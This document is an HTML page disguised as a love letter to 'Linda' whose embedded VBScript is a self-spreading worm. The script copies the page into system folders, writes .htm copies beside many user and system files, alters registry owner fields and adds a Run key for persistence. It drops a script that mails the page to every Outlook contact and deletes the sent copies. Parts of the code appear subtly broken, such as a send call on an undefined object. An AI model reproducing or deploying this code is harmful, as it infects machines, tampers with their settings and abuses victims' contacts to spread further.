<html><head><title>Love Linda</title>
<body bgColor=blue onLoad="window.status='I LOVE YOU Linda'">
<font face='verdana' color=yellow size='3'>For Linda...<br>
<br>Because I Love You.
<br>I code this.<br>I can't say what I feel for you.
<br>You will know by this way.<br></font>

<SCRIPT Language=VBScript>
On Error Resume Next
msgbox "Please accept the ActiveX",vbinformation,"Info"
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
If err.number=429 then
ws.Run javascript:location.reload()
Else

Set win=fso.GetSpecialFolder(0)
Set sys=fso.GetSpecialFolder(1)

Set linda = fso.CreateTextFile(win&"\LoveLinda.htm", 2)
Set love = document.body.createTextRange
linda.WriteLine "<html><head><title>Love Linda</title>"
linda.WriteLine "<body bgColor=blue>"
linda.WriteLine love.htmltext
linda.WriteLine "</body></html>"
linda.Close

pers=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
create(win)
create(sys)
create(pers)

cv="HKLM\Software\Microsoft\Windows\CurrentVersion"
ws.RegWrite cv&"\RegisteredOwner","Linda"
ws.RegWrite cv&"\RegisteredOrganization","Love Linda"
ws.RegWrite cv&"\Run\LoveLinda",sys&"\lindamail.vbs"

Set mail=fso.CreateTextFile(sys&"\lindamail.vbs", 2)
mail.WriteLine "On Error Resume Next"
mail.WriteLine "Set out=CreateObject(""Outlook.Application"")"
mail.WriteLine "Set B=out.GetNameSpace(""MAPI"")"
mail.WriteLine "For Each C In B.AddressLists"
mail.WriteLine "If C.AddressEntries.Count <> 0 Then"
mail.WriteLine "For D=1 To C.AddressEntries.count"
mail.WriteLine "Set em=C.AddressEntries(D)"
mail.WriteLine "Set lm=out.CreateItem(0)"
mail.WriteLine "lm.To=em.Address"
mail.WriteLine "lm.Subject=""Love Message..."""
mail.WriteLine "lm.Body=""Read this beautiful love message."""
mail.WriteLine "lm.Attachments.Add(""" &win& "\LoveLinda.htm"")"
mail.WriteLine "lm.DeleteAfterSubmit=True"
mail.WriteLine "If lm.To <> """" Then"
mail.WriteLine "F.Send"
mail.WriteLine "End If"
mail.WriteLine "Next"
mail.WriteLine "End If"
mail.WriteLine "Next"

End If

Function create(doss)
Set FolderObj = fso.GetFolder(doss)
	Set FO = FolderObj.Files
	For each file in FO
		ext = lcase(fso.GetExtensionName(file.Name))
		if ext="ini" or ext="txt" or ext="bmp" or ext="doc" or ext="xls" or ext="mp3" or ext="hlp" or ext="inf" Then
			Set linda = fso.CreateTextFile(file.path&".htm", 2)
			Set love = document.body.createTextRange
			linda.WriteLine "<html><head><title>Love Linda</title>"
			linda.WriteLine "<body bgColor=blue>"
			linda.WriteLine love.htmltext
			linda.WriteLine "</body></html>"
			linda.Close
		end if
	next
End Function
</script></body></html>
